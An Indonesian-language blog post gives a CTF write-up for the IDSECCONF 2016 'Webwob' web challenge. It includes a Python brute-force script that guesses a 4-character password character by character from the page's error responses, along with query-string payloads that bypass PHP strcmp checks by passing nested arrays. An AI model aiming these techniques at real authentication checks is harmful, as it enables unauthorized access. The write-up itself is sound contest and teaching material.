---
layout: post
title: "Writeup Idsecconf CTF 2016 : Webwob - 100"
description: "Writeup Idsecconf CTF 2016 Online"
headline: 
modified: 2016-08-29
date: 2016-08-29
category: Web Exploitation
tags: [idsecconf]
imagefeature: /images/idsecconf.jpg
mathjax: 
chart: 
comments: true
featured: false
---

### Problem :

`http://128.199.96.39/`

### Solusi :

Kita di berikan website dengan di tampilkan source code nya dan terlihat jelas flag akan muncul ketika
variable `$ok` bernilai `True`. 

pertama saya mencoba memasukan parameter password 4x seperti ini
`http://128.199.96.39/?password[]=awd&password[]=awd&password[]=awd&password[]=awd`
namun tidak berhasil.

kemudian karena kita mengetahui panjang karakter password hanya 4 maka kita buat script untuk bruteforce

```python
import mechanize
import itertools
import string

br = mechanize.Browser()
url = "http://128.199.96.39/?password={0}{1}{2}{3}"
response = br.open(url)

cnt = 0
pat = "invalid {}Invalid"
acc = string.ascii_letters + "0123456789!@#$%^{}()[]"
combinations = itertools.permutations(acc,cnt+1)
res = ""
a = "x"
b = "x"
c = "x"
d = "x"
bb = "x"
cc = "x"
dd = "x"

while True:
    combinations = itertools.permutations(acc,1)
    for x in combinations:
        x = "".join(x)
        if a == "x":
            aa = x
        elif b == "x":
            bb = x
        elif c == "x":
            cc = x
        elif d == "x":
            dd = x
            
        response = br.open(url.format(aa,bb,cc,dd))
        #print url.format(aa,bb,cc,dd)
        cek = response.read().split("<")[0]
        #sprint cek
        if "flag" in cek:
            print cek
            break
        #print x
        
        if pat.format(cnt+1) in cek:
            cnt += 1
            if a == "x":
                a = x
            elif b == "x":
                b = x
            elif c == "x":
                c = x
            elif d == "x":
                d = x
            #print x
```

![Webwob Flag](/images/webwob_flag.png)

scriptnya agak berantakan disitu tujuan kita untuk dapat flagnya tapi :D

setelah membaca writeup dari [Cyber Security IPB](https://drive.google.com/drive/folders/0B73v7q0VGLSEWlRUbU96YXlsNU0) ternyata cara bypass vulnerability Strcmp di sini adalah seperti ini 
`http://128.199.96.39/?password[][]=&password[][]=&password[][]=&password[][]=`
karena input kita awalnya adalah array karena di dalam script melakukan pengecekan 
berdasarkan tiap index maka jika tiap index yang akan di cek adalah array maka akan
membuahkan hasil True.
